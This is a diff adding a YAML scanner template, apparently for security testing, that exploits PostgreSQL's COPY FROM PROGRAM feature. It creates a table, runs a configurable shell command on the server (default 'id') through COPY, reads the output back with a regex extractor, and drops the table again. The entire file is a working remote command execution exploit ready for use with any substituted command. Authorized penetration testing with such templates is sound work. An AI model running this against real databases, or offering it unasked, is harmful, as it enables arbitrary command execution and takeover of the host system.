@@ -1,0 +1,26 @@
+id: postgresql-copy-program-exec
+service: [postgresql]
+variables:
+  cmd: id
+info:
+  name: PostgreSQL COPY FROM PROGRAM Command Execution
+  severity: critical
+  tags: postgresql,exploit,rce
+
+services:
+  - ops:
+      - db: "DROP TABLE IF EXISTS zombie_cmd_exec"
+      - db: "CREATE TABLE zombie_cmd_exec(cmd_output text)"
+      - db: "COPY zombie_cmd_exec FROM PROGRAM '{{cmd}}'"
+      - db: "SELECT 'output=' || cmd_output FROM zombie_cmd_exec"
+        name: cmd_output
+      - db: "DROP TABLE IF EXISTS zombie_cmd_exec"
+    matchers:
+      - type: word
+        part: cmd_output
+        words: ["output="]
+    extractors:
+      - type: regex
+        name: postgresql_cmd_result
+        part: cmd_output
+        regex: ['(?m)^output=(.+)$']
